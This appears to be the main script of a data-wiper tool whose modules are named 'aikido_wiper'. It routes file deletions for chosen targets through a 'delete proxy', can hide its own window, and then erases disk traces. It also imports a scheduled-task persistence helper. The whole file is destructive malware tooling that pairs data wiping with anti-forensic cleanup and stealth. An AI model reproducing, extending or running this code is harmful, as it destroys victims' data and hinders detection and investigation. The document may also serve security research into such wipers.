import time

from aikido_wiper.wipe_utils import erase_disk_traces
from configs.args import erase_traces_based_on_args, parse_args, create_proxy_from_conf, find_deletion_targets_from_args
from aikido_wiper.windows_utils import task_scheduler_stay_persistent_with_args, kill_process_window



def main():
    args = parse_args()

    if args.quiet:
        kill_process_window()

    if "ERASE_DISK_TRACES" == args.mode:
        erase_disk_traces()
        return 0
    
    delete_proxy = create_proxy_from_conf(args)
    deletion_targets = list(find_deletion_targets_from_args(args))
    
    failed_targets = delete_proxy.indirect_delete_paths(deletion_targets)

    print("Failed targets:")
    print("------------------------")
    for path in failed_targets:
        print(path)
    print("------------------------")

    erase_traces_based_on_args(args)

    return 0

if __name__ == "__main__":
    main()